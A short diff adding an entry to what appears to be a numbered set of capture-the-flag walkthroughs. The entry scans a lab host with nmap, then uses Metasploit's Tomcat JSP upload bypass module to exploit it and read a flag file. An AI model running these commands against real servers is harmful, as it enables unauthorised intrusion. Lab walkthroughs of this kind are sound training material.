@@ -1131,8 +1131,25 @@ dir
 type flag.txt
 
 ```
+59) Windows: Java Web Server
+    
+```
+nmap --top-ports 65536 10.0.0.141
+firefox 10.0.0.141:8080
+msfconsole
+use exploit/multi/http/tomcat_jsp_upload_bypass
+set RHOSTS 10.0.0.141
+check (We are running a “check” command in the metasploit framework to make sure that if
+the target is vulnerable to jsp_upload_bypass or not.)
+exploit
+cd /
+dir
+type flag.txt
+```
+60)
+```
 
-
+```
 
 
 
